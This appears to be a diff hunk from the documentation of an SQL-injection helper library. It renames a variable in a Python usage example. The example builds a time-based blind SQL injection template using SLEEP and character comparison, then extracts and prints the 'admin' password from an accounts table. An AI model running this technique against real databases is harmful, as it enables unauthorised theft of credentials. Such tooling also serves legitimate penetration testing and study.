@@ -73,9 +73,9 @@ template = string.Template(f'OR (SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($reques
 # the expected values are ASCII alphanum
 candidates = SqliHelper.string_to_candidates(string.ascii_letters + string.digits)
 
-binder.prepare_new(candidates, template=template)
+helper.prepare_new(candidates, template=template)
 
-result = binder.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
+result = helper.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
 print("pass for 'admin' : ", "".join(map(chr, result)))
 ```
 
